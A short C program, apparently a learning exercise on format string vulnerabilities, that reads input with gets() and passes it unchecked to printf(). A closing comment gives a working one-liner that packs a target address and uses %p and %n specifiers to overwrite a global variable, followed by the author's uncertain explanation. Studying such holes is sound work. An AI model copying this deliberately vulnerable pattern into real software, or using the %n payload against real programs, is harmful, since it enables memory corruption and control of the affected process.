/* 
Target of this program is to understand the what are format string
vulnerabilities.

Compilation command:
    gcc -m32 -g string.c

ASLR mode OFF

*/

#include<stdio.h>
#include<string.h>
#include<stdio.h>

int myvar;

int main(int argc, char** argv)
{
    char buffer[100];
    gets(buffer);
    printf(buffer);
    if(myvar)
        printf("Cool you changed it .. :) ");
    return 0;
}

/*
not sure how this works
echo -e `python -c "import struct; print struct.pack('<I',0x0804a028)"`"%p %p %p %p %p %p %p %p %p %n" | ./string1
I think you put the address of the variable in the buffer 
then you write some bytes to the buffer but maybe because there is a pointer
it alters the global var value and makes the if true?